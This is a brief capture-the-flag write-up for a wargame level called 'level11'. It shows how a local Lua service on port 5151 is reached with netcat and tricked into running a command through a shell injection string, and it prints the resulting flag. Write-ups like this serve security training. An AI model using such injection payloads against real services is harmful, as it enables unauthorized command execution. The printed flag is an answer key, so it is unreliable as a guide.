# level11

1. examinate existing files permissions

```shell
ls -la
```

shows a lua script that is supposed to run on 127.0.0.1:5151

2. try to connect to it with netcat

```shell
nc localhost 5151
```

Asking for a password, as expected

3. inject some code to trick the script to run getflag for us

```shell
pwnd; getflag | write level11; echo pwnd
```

gives flag `fa6v5ateaw21peobuub8ipe6s`
